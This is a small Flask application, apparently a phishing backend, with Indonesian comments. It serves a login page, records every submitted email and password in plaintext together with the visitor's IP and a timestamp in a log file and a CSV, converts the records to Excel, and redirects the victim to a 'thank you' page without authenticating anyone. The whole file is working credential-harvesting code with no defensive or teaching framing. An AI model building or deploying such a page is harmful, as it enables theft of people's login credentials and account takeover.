from flask import Flask, render_template, request, redirect
import csv
import datetime
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['username']
    password = request.form['password']
    ip = request.remote_addr
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Simpan ke log
    with open("login.log", "a") as f:
        f.write(f"[{waktu}][{ip}] Email: {email} | Password: {password}\n")

    # Simpan ke CSV
    with open("data_login.csv", "a", newline='') as f:
        writer = csv.writer(f)
        writer.writerow([waktu, ip, email, password])

    # Jalankan konversi Excel
    subprocess.run(["python", "convert_to_excel.py"])

    return redirect("/terima_kasih")

@app.route('/terima_kasih')
def terima_kasih():
    return render_template('terima_kasih.html')

if __name__ == '__main__':
    app.run(debug=True)
